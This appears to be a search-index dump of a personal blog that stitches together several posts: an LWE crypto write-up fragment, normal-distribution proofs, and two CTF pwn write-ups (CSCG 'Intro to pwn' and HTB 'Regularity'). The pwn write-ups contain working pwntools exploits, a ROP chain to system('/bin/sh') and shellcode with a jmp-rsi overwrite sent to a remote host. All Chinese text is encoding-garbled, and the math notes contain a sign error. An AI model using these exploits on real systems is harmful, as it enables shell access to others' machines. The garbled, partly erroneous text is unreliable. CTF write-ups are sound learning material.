324976521789232911848337505841284978746361536915903971011255451438673522500730537005137182463678372897314198988595, 395621759076694189110473461483468243816716472466025836871653502259071450104902960119128530517955567830675053452079, 539300517585750216948117617165146582589224695990488749904551961039061424290129525221984586819908097960720708938354, 29279302128607422250205549520059282069518559284219582605487413142781822276106373289432262133635053599391124926385, 554047387889265384869858916477442181952403597250555948392949469296673941793381852004501421929101000148453680659392, 117780825424837288494479009381221759361151487239443821133102414888864152904732196195473813006762420646998382258677, 513764579681988270425418630365712613073908798769959690739998792846173650211508078458011456784363312999085649615413, 421686906289957894155024887354760839265000904451245772175308131137467275202489561700021659858819873604538650489994, 420037832423259525388141394520857134457021929872555809167052539034540217718781279113965175987358081438109891771580, 36451605745112040602804954235939462081346791770310181663631699054048414835838956409055640948581948016033003511333, 65866443469866248828119099994518897685990064406903627156894902667947376070679854260383038634727146436274230980496, 27676413701492447763964945205769602759768347623741189980278225943728587187940271050634054217590942659542302722334, 500312789935788689187812810985806111797362028998353677843819125485045576943472901976055579663665267905809820905862, 520064354401353505774803720281331074080600746212325401527048530022713769008774050816490541356142354757805595273068, 495854656037423684061417113244964481431602915324717605570975073575414392233479237472936965636133612283412033946051, 91739870792230359210043046401786959190045929124141709653873699398574077579395785555200462734509728806350612588545, 484531754577892922131892661653620989224382080321025512011181426678442547912964573223048519566085582623517825865418, 112714684344084391078866980839255594355187885339701715768009153551270432322826715969989728340963213693095849427668, 404429204723786534299525333122163342588586991421902466839808468487493896330979873416105908841447535426923681220957, 92404742424217640040375362532444172359091402942418950195520660310216430170054358290537973281349284862065214755739, 224043393969043013532511880223075809120842856165608086692928112430171548569493398551019081676395857489451126409940, 4305919427803364191555497499680058924116536587126751817219863902878291078989381194676206640960307162723876513248]Encrypted Flag: 45690752833299626276860565848930183308016946786375859806294346622745082512511847698896914843023558560509878243217521 è§£Learning With Errors 1LWE Backgroundé¢˜ è§£1Oded Regev è®ºæ–‡é“¾æ¥ï¼šhttps://cims.nyu.edu/~regev/papers/lwesurvey.pdf LWE Introé¢˜ è§£å½“æ²¡æœ‰noiceäº†ï¼Œæˆ‘ä»¬å°±åªéœ€è¦è§£ä¸€ä¸ªçº¿æ€§æ–¹ç¨‹ç»„ï¼šé€šè¿‡$A$ä»¥åŠ$AS$çš„å€¼æ±‚å‡º$S$ã€‚ 1Gaussian Elimination LWE High Bits Messageé¢˜è§£LWE Low Bits Messageé¢˜è§£From Private to Public Key LWEé¢˜è§£Learning With Errors 2","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Lattices","slug":"Lattices","permalink":"https://archer-baiyi.github.io/tags/Lattices/"},{"name":"LWE(Learning With Error)","slug":"LWE-Learning-With-Error","permalink":"https://archer-baiyi.github.io/tags/LWE-Learning-With-Error/"}]},{"title":"Probability Distributions","slug":"TUM  æ•°å­¦ ç¬”è®°/æ¦‚ç‡è®º/Probability-Distributions","date":"2025-06-26T15:05:33.000Z","updated":"2025-06-26T19:24:43.028Z","comments":true,"path":"2025/06/26/TUM  æ•°å­¦ ç¬”è®°/æ¦‚ç‡è®º/Probability-Distributions/","permalink":"https://archer-baiyi.github.io/2025/06/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/Probability-Distributions/","excerpt":"å„ç§æ¦‚ç‡åˆ†éƒ¨","text":"Normal DistributionDefinition:For $\\mu \\in \\mathbb{R}$ and $\\sigma &gt; 0$, we call a distribution with the density functionf(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}, \\quad x \\in \\mathbb{R},the normal distribution $N(\\mu, \\sigma^2)$. For $\\mu = 0$ and $\\sigma^2 = 1$, this reduces to the densityf(x) = \\frac{1}{\\sqrt{2\\pi}} e^{-\\frac{x^2}{2}}, \\quad x \\in \\mathbb{R},of the standard normal distribution $N(0, 1)$. Theorem:For $\\mu \\in \\mathbb{R}$ and $\\sigma &gt; 0$, the functionf(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}, \\quad x \\in \\mathbb{R},is indeed a density function. Proof: Using the substitution $y = \\frac{x - \\mu}{\\sigma}$, so that $dx = \\sigma \\, dy$, we have: \\int_{\\mathbb{R}} f(x) \\, dx = \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^\\infty e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}} \\, dx = \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy = \\frac{1}{\\sqrt{2\\pi}} \\cdot I,where I = \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy.Note that this integral exists. Consider: I^2 = \\left( \\int_{-\\infty}^\\infty e^{-\\frac{x^2}{2}} \\, dx \\right) \\left( \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy \\right) = \\int_{-\\infty}^\\infty \\int_{-\\infty}^\\infty e^{-\\frac{x^2 + y^2}{2}} \\, dx \\, dy.We switch to polar coordinates, i.e., we substitute x = r \\cos \\theta, \\quad y = r \\sin \\theta, \\quad r > 0, \\; \\theta \\in [0, 2\\pi).We compute the Jacobian determinant: \\left| \\frac{\\partial(x, y)}{\\partial(r, \\theta)} \\right| = \\left| \\begin{matrix} \\cos\\theta & -r \\sin\\theta \\\\ \\sin\\theta & r \\cos\\theta \\end{matrix} \\right| = r.So we obtain: I^2 = \\int_0^\\infty \\int_0^{2\\pi} e^{-\\frac{r^2}{2}} r \\, d\\theta \\, dr = 2\\pi \\int_0^\\infty r e^{-\\frac{r^2}{2}} \\, dr.Substitute $u = \\frac{r^2}{2}$, so that $du = r \\, dr$: 2\\pi \\int_0^\\infty e^{-u} \\, du = 2\\pi [-e^{-u}]_0^\\infty = 2\\pi.Hence, we conclude: I = \\sqrt{2\\pi}, \\quad \\text{and therefore} \\quad \\int_{\\mathbb{R}} f(x) \\, dx = 1.$\\square$ Theorem: Let $X \\sim N(\\mu,\\sigma^2)$ be a random variable, then\\mathbb{E}[X] = \\mu, \\quad Var(X) = \\sigma^2. Proof: Expectation: Substitute $z = \\frac{x - \\mu}{\\sigma} \\Rightarrow x = \\sigma z + \\mu$, and $dx = \\sigma dz$: \\begin{aligned} \\mathbb{E}[X] &= \\int_{-\\infty}^{\\infty} (\\sigma z + \\mu) \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\sigma \\frac{1}{\\sqrt{2\\pi}}\\int_{-\\infty}^{\\infty} z \\cdot e^{-z^2/2} \\, dz +\\mu \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-z^2/2} \\, dz \\\\ \\end{aligned}First notice that $z \\cdot e^{-z^2/2}$ is an odd function. Since \\int_{-\\infty}^{\\infty} |z e^{-z^2/2}| \\, dz = 2 \\int_0^{\\infty} z e^{-z^2/2} \\, dz = 2 \\cdot [-e^{-z^2/2}]_0^\\infty = 1,we have \\frac{\\sigma}{\\sqrt{2\\pi}}\\int_{-\\infty}^{\\infty} z \\cdot e^{-z^2/2} \\, dz = 0.(Do keep in mind: if $f$ is an odd function, then \\int_{\\infty}^{\\infty}|f(x)|dx < \\inftyis a necessary condition of $\\int_{\\infty}^{\\infty}f(x)dx = 0$ . Because otherwise, $f(x)=x$ is a simple counterexample.) Moreover, we have seen in the last proof that \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-z^2/2} \\, dz = 1.Therefore, \\mathbb{E}[X] = \\sigma \\cdot 0 + \\mu \\cdot 1 = \\mu.Variance: We compute: \\mathrm{Var}(X) = \\mathbb{E}[X^2] - (\\mathbb{E}[X])^2 = \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx - \\mu^2Again substitute $z = \\frac{x - \\mu}{\\sigma} \\Rightarrow x = \\sigma z + \\mu$, and $dx = \\sigma dz$: \\begin{aligned} \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx &= \\int_{-\\infty}^{\\infty} (\\sigma z + \\mu)^2 \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\int_{-\\infty}^{\\infty} (\\sigma^2 z^2 + 2\\sigma \\mu z + \\mu^2) \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\sigma^2 \\int z^2 \\phi(z) \\, dz + 2\\sigma\\mu \\int z \\phi(z) \\, dz + \\mu^2 \\int \\phi(z) \\, dz \\\\ &= \\sigma^2 \\cdot 1 + 2\\sigma\\mu \\cdot 0 + \\mu^2 \\cdot 1 \\\\ &= \\sigma^2 + \\mu^2 \\end{aligned},where \\phi(z) = \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2}.In addition, since $\\phiâ€™(z) = z\\phi(z)$, \\begin{aligned} \\int_{-\\infty}^{\\infty} z^2 \\phi(z) \\, dz &= \\int_{-\\infty}^{\\infty} z \\cdot (-\\phi'(z)) \\, dz \\\\ &\\overset{\\text{integration by parts}}{=} [-z\\phi(z)]_{-\\infty}^{\\infty} + \\int_{-\\infty}^{\\infty} \\phi(z) \\, dz \\\\ &= 0+1 = 1. \\end{aligned}Finally, we have \\mathrm{Var}(X) = \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx - \\mu^2 = \\sigma^2 + \\mu^2 - \\mu^2 = \\sigma^2.$\\square$","categories":[{"name":"TUM æ•°å­¦ ç¬”è®°","slug":"TUM-æ•°å­¦-ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"æ¦‚ç‡è®º Probability Theory","slug":"TUM-æ•°å­¦-ç¬”è®°/æ¦‚ç‡è®º-Probability-Theory","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/"}],"tags":[{"name":"æ¦‚ç‡è®º","slug":"æ¦‚ç‡è®º","permalink":"https://archer-baiyi.github.io/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/tags/Probability-Theory/"}]},{"title":"CSCG 2025 Intro_to_pwn Writeup","slug":"CTF/Pwn/CSCG-2025-Intro-to-pwn-Writeup","date":"2025-06-18T20:18:48.000Z","updated":"2025-06-18T22:27:12.930Z","comments":true,"path":"2025/06/18/CTF/Pwn/CSCG-2025-Intro-to-pwn-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/18/CTF/Pwn/CSCG-2025-Intro-to-pwn-Writeup/","excerpt":"","text":"é¢˜ç›®è¿™é“é¢˜ç»™äº†æºä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;// --------------------------------------------------- SETUPvoid ignore_me_init_buffering()&#123; setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0);&#125;// --------------------------------------------------- VULNERABLE FUNCTIONvoid win()&#123; system(&quot;echo no cat /flag for you&quot;);&#125;void vuln() &#123; char name[16]; printf(&quot;What is your name?\\n&quot;); gets(name); printf(&quot;Hello %s!\\nI have a present for you: %d\\n&quot;, name, 0xc35f);&#125;// --------------------------------------------------- MAINint main(int argc, char **argv)&#123; (void)argc; (void)argv; ignore_me_init_buffering(); vuln(); return 0;&#125; è§‚å¯Ÿ/åˆ†æé€šè¿‡é˜…è¯»æºä»£ç å³å¯å‘ç°è¿™é“é¢˜çš„æ ¸å¿ƒæ¼æ´ï¼š 123char name[16];printf(&quot;What is your name?\\n&quot;);gets(name); å³åˆ©ç”¨Buffer Overflowã€‚ é¦–å…ˆæ³¨æ„åˆ°ï¼Œè™½ç„¶è¯´ç›´æ¥è°ƒç”¨win()å‡½æ•°å¹¶æ²¡æœ‰ä»»ä½•å®é™…æ„ä¹‰ï¼Œå› ä¸ºå®ƒä¸èƒ½å¸®æˆ‘ä»¬è¯»å–flagã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨win()é‡Œè°ƒç”¨çš„system()å‡½æ•°ã€‚ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨çš„æ€è·¯å°±æ˜¯æƒ³åŠæ³•è°ƒç”¨system()å‡½æ•°å¹¶ä¼ å…¥/bin/shä½œä¸ºå‚æ•°ã€‚ é¦–å…ˆåˆ©ç”¨pwntoolsé‡Œçš„ä¸€ä¸ªå‡½æ•° 12345678from pwn import *elf = context.binary = ELF(&#x27;./intro-pwn&#x27;, checksec=False)p = elf.process()pop_rdi = next(elf.search(asm(&#x27;pop rdi ; ret&#x27;)))print(pop_rdi)# 4198917 å¯ä»¥ç¡®å®šè¿™ä¸ªç¨‹åºæŸä¸ªåœ°æ–¹ä½¿ç”¨äº†pop rdi ; retå‘½ä»¤å¹¶å¯ä»¥æ‰¾åˆ°å®ƒçš„åœ°å€ã€‚ å…ˆæ¥è§£é‡Šä¸€ä¸‹è¿™ä¸ªå‘½ä»¤ï¼špop rdi ; ret ä¼šä»å½“å‰æ ˆé¡¶å–å‡ºä¸€ä¸ªå€¼æ”¾å…¥ rdi å¯„å­˜å™¨ï¼ˆå³å‡½æ•°ç¬¬ 1 ä¸ªå‚æ•°ï¼‰ï¼Œç„¶åè·³è½¬åˆ°ä¸‹ä¸€ä¸ªåœ°å€ç»§ç»­æ‰§è¡Œã€‚ åœ¨ x86-64 System V è°ƒç”¨çº¦å®šä¸­ï¼Œå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°é€šè¿‡ rdi ä¼ é€’ï¼Œå®ƒä¼ çš„æ˜¯å€¼ï¼Œä¸æ˜¯åœ°å€ï¼›å¦‚æœè¿™ä¸ªå€¼æ˜¯åœ°å€ç±»å‹ï¼ˆå¦‚æŒ‡é’ˆï¼‰ï¼Œå‡½æ•°å†…éƒ¨æ‰ä¼šç”¨å®ƒå½“ä½œåœ°å€æ¥è¯»å–å†…å®¹ã€‚ è€Œretå‘½ä»¤å…·ä½“æ‰§è¡Œçš„å†…å®¹æ˜¯ï¼š ä» [rsp] å– 8 å­—èŠ‚ â†’ èµ‹å€¼ç»™ ripï¼ˆæŒ‡ä»¤æŒ‡é’ˆï¼‰ rsp += 8 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‘½ä»¤æ„é€ ä¸€æ¡è¿™æ ·çš„ROPé“¾ï¼š 123payload += p64(pop_rdi)payload += p64(input_add)payload += p64(function_add) 123[RSP] â†’ pop_rdi ; ç¬¬ä¸€æ¬¡ ret è·³è¿›è¿™ä¸ª gadget[RSP+8] â†’ input_add ; ä¼šè¢« pop åˆ° rdi[RSP+16] â†’ function_add ; å† ret åˆ°è¿™ä¸ªåœ°å€ï¼Œè·³è¿›æˆ‘ä»¬æŒ‡å®šçš„ function_add ç›¸å½“äºæ‰§è¡Œäº† 1function(input) ä¸è¿‡è¦æ³¨æ„ä¸€ç‚¹ï¼špop rdi ä»æ ˆä¸Šå¼¹å‡º 8 å­—èŠ‚ï¼Œè¿™ä¸ªå€¼å°†è¢«è§†ä¸º â€œåœ°å€â€ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡è¿™ä¸ªå‘½ä»¤å°†/bin/shä½œä¸ºå‚æ•°ä¼ é€’ç»™system()å‡½æ•°ï¼Œè€Œæ˜¯éœ€è¦å°†æ•´ä¸ªè¿‡ç¨‹åˆ†2æ­¥ï¼š é€šè¿‡è°ƒç”¨gets()å‡½æ•°å…ˆå°†/bin/shå†™å…¥åˆ°dataæ®µé‡Œçš„æŸä¸ªåœ°æ–¹ï¼ˆæˆ‘ä»¬ç»™å®šçš„åœ°å€ï¼‰ï¼› å°†åˆšæ‰è¢«å†™å…¥çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ ç»™system()ã€‚ æœ€åå†æ¥ç¡®è®¤ä¸€ä¸‹Stackçš„ç»“æ„ä»¥åŠæˆ‘ä»¬å‰é¢æåˆ°çš„éœ€è¦çš„å„ä¸ªåœ°å€ï¼š åœ¨IDAé‡Œç‚¹å‡»vuln()å‡½æ•°çš„nameï¼š ç¡®è®¤ä¸€å¼€å§‹çš„å¡«å……ä¸º 12payload = b&quot;A&quot;*16payload += b&quot;B&quot;*8 é€šè¿‡Alt+tæœç´¢systemï¼Œdataï¼Œgetså¯ä»¥ç¡®å®šï¼š systemçš„åœ°å€ï¼š 1sys_add = 0x401040 gets()çš„åœ°å€ï¼š Dataæ®µå¼€å§‹çš„åœ°å€ï¼š 1data_add = 0x404028 Exploit12345678910111213141516171819202122232425262728293031323334from pwn import *elf = context.binary = ELF(&#x27;./intro-pwn&#x27;, checksec=False)p = elf.process()sys_add = 0x401040gets_add = 0x401060data_add = 0x404028pop_rdi = next(elf.search(asm(&#x27;pop rdi ; ret&#x27;)))# ç¬¬ä¸€è½®ROPpayload = b&quot;A&quot;*16payload += b&quot;B&quot;*8# å°†dataå—çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ é€’ç»™getså‡½æ•°å¹¶è°ƒç”¨gets# å°†&quot;/bin/sh&quot;å†™å…¥dataå—payload += p64(pop_rdi)payload += p64(data_add)payload += p64(gets_add)# ç¬¬äºŒè½®ROP# å°†åˆšå†™å…¥çš„dataé‡Œçš„&quot;/bin/sh&quot;ä½œä¸ºå‚æ•°ä¼ é€’ç»™system()å‡½æ•°payload += p64(pop_rdi)payload += p64(data_add)payload += p64(sys_add)# å‘é€p.sendlineafter(b&#x27;name?\\n&#x27;, payload)p.sendline(b&quot;/bin/sh&quot;)p.interactive()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"}]},{"title":"HTB Regularity Writeup","slug":"CTF/Pwn/HTB-Regularity-Writeup","date":"2025-06-11T19:43:48.000Z","updated":"2025-08-21T09:20:34.143Z","comments":true,"path":"2025/06/11/CTF/Pwn/HTB-Regularity-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/11/CTF/Pwn/HTB-Regularity-Writeup/","excerpt":"ret2regã€‚é€šè¿‡Buffer Overflowå°†è¿”å›åœ°å€ä¿®æ”¹æˆæˆ‘ä»¬è‡ªå·±æ‰‹å†™çš„/bin/shå‘½ä»¤ã€‚","text":"é¢˜ç›® è§‚å¯Ÿåˆ†æå¼€å§‹çš„å¼€å§‹æˆ‘ä»¬å…ˆç¡®è®¤ä¸€ä¸‹è¿™ä»½æ–‡ä»¶çš„å®‰å…¨æ€§æªæ–½æœ‰å“ªäº›ï¼š 12345678910â””â”€$ checksec regularity[*] &#x27;/home/archer/ctf-kali/regularity&#x27; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments Stripped: No æ³¨æ„åˆ°è¿™ä¸ªç¨‹åºå¹¶æ²¡æœ‰NXï¼ˆNo-eXecuteï¼‰æªæ–½ï¼Œè¿™ä¼šæˆä¸ºæˆ‘ä»¬åç»­æ”»å‡»çš„æœ€æ ¸å¿ƒçš„å‰ææ¡ä»¶ï¼ ç”¨IDAæ‰“å¼€æ–‡ä»¶ï¼š è¿™ä¸ªread()æ¯”è¾ƒå¯ç–‘ï¼Œä½†æ˜¯åœ¨ä¼ªä»£ç é¡µé¢æ²¡æœ‰æ‰¾åˆ°æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬è½¬å»æŸ¥çœ‹æ±‡ç¼–ã€‚ åœ¨IDAä¸€å¼€å§‹çš„è¿™ä¸ªé»˜è®¤é¡µé¢åŒå‡»readï¼š å¯ä»¥å‘ç°ç¨‹åºåˆ†é…äº†0x100ä½çš„Bufferï¼Œä½†æ˜¯å´è¯»å–äº†0x110ä½æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªBuffer Overflowçš„æ¼æ´ã€‚ ä½†æ˜¯ç”±äºåœ¨Exportsé¡µé¢æ²¡æœ‰æ‰¾åˆ°ä»»ä½•å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼š æ‰€ä»¥è¿™é“é¢˜æˆ‘ä»¬éœ€è¦å¦è¾Ÿè¹Šå¾„ã€‚ æˆ‘ä»¬å›æ¥é‡æ–°ä»”ç»†çœ‹ä¸€ä¸‹read()å‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼š 1234567891011121314151617181920212223; signed __int64 read()read proc nearbuf = byte ptr -100h ; å®šä¹‰ä¸€ä¸ªå±€éƒ¨å˜é‡ bufï¼Œå¤§å° 0x100ï¼ˆ256 å­—èŠ‚ï¼‰sub rsp, 100h ; åˆ†é… 0x100 å­—èŠ‚æ ˆç©ºé—´ï¼Œrsp å‘ä¸‹ç§»åŠ¨ï¼Œç•™å‡º buffer ç©ºé—´mov eax, 0 ; syscall ç¼–å· 0 â†’ sys_readmov edi, 0 ; å‚æ•° rdi = 0 â†’ æ–‡ä»¶æè¿°ç¬¦ 0ï¼ˆstdinï¼‰lea rsi, [rsp+100h+buf] ; rsi = rspï¼Œå³ buffer çš„åœ°å€ï¼ˆrsp + 0 = rspï¼‰ ; ç›¸å½“äº rsi = rsp â†’ ç¬¬ 2 ä¸ªå‚æ•°ï¼Œè¯»å–çš„ç›®æ ‡ç¼“å†²åŒºmov edx, 110h ; ç¬¬ 3 ä¸ªå‚æ•° â†’ è¯»å–é•¿åº¦ä¸º 0x110ï¼ˆ272 å­—èŠ‚ï¼‰ ; ä½† buffer åªæœ‰ 0x100 â†’ äº§ç”Ÿ 16 å­—èŠ‚æ ˆæº¢å‡ºæ¼æ´ï¼syscall ; æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ read(0, rsp, 0x110)add rsp, 100h ; æ¢å¤æ ˆæŒ‡é’ˆï¼Œé‡Šæ”¾å±€éƒ¨å˜é‡ç©ºé—´retn ; è¿”å›è°ƒç”¨è€…ï¼ˆä½†å¯èƒ½å·²è¢«è¦†ç›–ï¼‰read endp æ³¨æ„åˆ°rsi æ˜¯å½“å‰bufferçš„èµ·å§‹åœ°å€ã€‚è€ŒåŒæ—¶åœ¨é˜…è¯»main()å‡½æ•°çš„æ±‡ç¼–æ—¶å¯ä»¥å‘ç°è¿™è¡Œå‘½ä»¤ï¼š 1jmp rsi æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™å…¥ä¸€æ®µè‡ªå·±æ‰‹å†™çš„/bin/shå‘½ä»¤çš„æ±‡ç¼–ä»£ç ï¼Œå¹¶å°†è¿”å›åœ°å€ä¿®æ”¹æˆrsiï¼Œè¿™æ ·ç¨‹åºå°±ä¼šè‡ªåŠ¨è¿è¡Œæˆ‘ä»¬æ‰‹å†™çš„/bin/shå‘½ä»¤ã€‚ï¼ˆä¸è¿‡è¦æ³¨æ„ï¼Œè¿™ä¸ªæ”»å‡»èƒ½å¤Ÿå¥æ•ˆæœ€æ ¸å¿ƒçš„å‰ææ˜¯æ ˆæ˜¯å¯æ‰§è¡Œçš„ï¼Œå³æ²¡æœ‰NXï¼ˆNo-eXecuteï¼‰ã€‚ï¼‰ Exploitè¿™é“é¢˜åœ¨Windowsç³»ç»Ÿé‡Œåšå’Œåœ¨Linuxé‡Œä¸å¤ªä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä¼šåˆ†åˆ«ä»‹ç»ä»–ä»¬æ‰€éœ€çš„æ“ä½œã€‚ Linuxé¦–å…ˆè®²åœ¨Linuxç³»ç»Ÿä¸‹çš„è§£é¢˜è¿‡ç¨‹ï¼Œå› ä¸ºå¯ä»¥ç”¨ä¾¿æºçš„å‘½ä»¤ 1next(elf.search(asm(&#x27;jmp rsi&#x27;))) è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ï¼š asm(&#39;jmp rsi&#39;)ï¼šå°†æ±‡ç¼–æŒ‡ä»¤ jmp rsi è½¬æ¢ä¸ºæœºå™¨ç ï¼ˆå­—èŠ‚ç ï¼‰ï¼› elf.search(...)ï¼šåœ¨ç›®æ ‡ ELF æ–‡ä»¶ä¸­æœç´¢åŒ…å«è¿™æ®µæœºå™¨ç çš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯æŸ¥æ‰¾ gadgetï¼‰ï¼› next(...)ï¼šè·å–æœç´¢åˆ°çš„ç¬¬ä¸€ä¸ªç»“æœï¼Œå³ jmp rsi çš„å®é™…åœ°å€ï¼› è€Œ 1asm(shellcraft.sh()) è¿™ä¸ªå‘½ä»¤æ˜¯ PwnTools åº“ä¸­æä¾›çš„ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆ shellcode çš„ä¾¿æ·æ–¹æ³•ï¼Œå…·ä½“ä½œç”¨å¦‚ä¸‹ï¼š shellcraft.sh()ï¼šç”Ÿæˆä¸€æ®µç”¨äºæ‰§è¡Œ /bin/sh çš„æ±‡ç¼–ä»£ç ï¼ˆé»˜è®¤é€‚ç”¨äºå½“å‰è„šæœ¬æ‰€å¤„å¹³å°ï¼ˆè¿™é‡Œæ˜¯Linuxï¼‰çš„ 64 ä½ execve(&quot;/bin/sh&quot;, NULL, NULL) ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼› asm(...)ï¼šå°†ä¸Šé¢çš„æ±‡ç¼–ä»£ç è½¬æ¢ä¸ºçœŸå®çš„æœºå™¨ç ï¼ˆä¹Ÿå°±æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œçš„ shellcode å­—èŠ‚ä¸²ï¼‰ï¼› è¿™ä¸ªå‘½ä»¤æ˜¯åœ¨Windowsé‡Œä¹Ÿå¯ä»¥ä½¿ç”¨çš„ï¼Œåªä¸è¿‡éœ€è¦ç‚¹é¢å¤–çš„å£°æ˜ã€‚ Exploitä»£ç ï¼š 1234567891011121314151617181920212223242526272829from pwn import *elf = context.binary = ELF(&#x27;./regularity&#x27;, checksec=False)# p = process()# è¿™é‡Œçš„pæ˜¯ç”¨äºæœ¬åœ°æµ‹è¯•çš„ï¼Œåªèƒ½åœ¨Linuxä¸Šä½¿ç”¨ï¼Œè¿™ä¸ªè¿™ä¸ªæ–‡ä»¶æ˜¯elfæ ¼å¼çš„ã€‚r = remote(&quot;94.237.51.163&quot;,52671)# æ‰¾åˆ° jmp rsi æŒ‡ä»¤åœ°å€JMP_RSI = next(elf.search(asm(&#x27;jmp rsi&#x27;)))# æ„é€  payloadï¼šshellcode + æº¢å‡º + jmp rsi åœ°å€payload = flat(&#123; 0: asm(shellcraft.sh()), # shellcode 256: JMP_RSI # æº¢å‡º return address&#125;)# p.sendlineafter(b&#x27;days?\\n&#x27;, payload)# p.interactive()r.sendlineafter(b&#x27;days?\\n&#x27;, payload)r.interactive()# $ ls# core# flag.txt# regularity# $ cat flag.txt# HTB&#123;jMp_rSi_jUmP_aLl_tH3_w4y!&#125; è§£é‡Šä¸€ä¸‹flat()è¿™ä¸ªå‡½æ•°ï¼š å®ƒæŠŠä¸€ä¸ªç»“æ„åŒ–çš„æ•°æ®ï¼ˆå¦‚å­—èŠ‚ä¸²ã€æ•´æ•°ã€åœ°å€ã€dict å¸ƒå±€ï¼‰è½¬æ¢æˆè¿ç»­çš„ bytes ç±»å‹ï¼Œä¾›ä½ å‘é€æˆ–å†™å…¥ç¨‹åºã€‚ç”¨äºè‡ªåŠ¨æ„é€ äºŒè¿›åˆ¶ payloadã€‚ è¿™æ®µä»£ç ï¼š 1234payload = flat(&#123; 0: asm(shellcraft.sh()), # shellcode 256: JMP_RSI # è¦†ç›– return address&#125;) ä¼ å…¥çš„æ˜¯ä¸€ä¸ª å­—å…¸ï¼ˆdictï¼‰ç»“æ„ï¼Œè¡¨ç¤ºå¸Œæœ›æ„é€ ä¸€ä¸ªå†…å­˜å¸ƒå±€ï¼š ä» offset 0 å¼€å§‹ï¼šæ”¾å…¥ shellcode ä» offset 256 å¼€å§‹ï¼šæ”¾å…¥è·³è½¬åœ°å€ JMP_RSIï¼ˆä¼šè¢«è‡ªåŠ¨è½¬æˆå°ç«¯æ ¼å¼ï¼‰ è€Œflat() ä¼šè‡ªåŠ¨ï¼š è®¡ç®—å‡º offset ä¹‹é—´çš„ paddingï¼ˆè‡ªåŠ¨è¡¥é›¶æˆ– NOPï¼‰ æŠŠæ•´æ•° JMP_RSI è‡ªåŠ¨è½¬æ¢ä¸º 64 ä½å°ç«¯åœ°å€ï¼ˆç­‰ä»·äº p64(JMP_RSI)ï¼‰ æœ€ç»ˆæ‹¼æ¥å‡ºä¸€æ®µå®Œæ•´çš„ã€å¯å‘é€çš„ payload 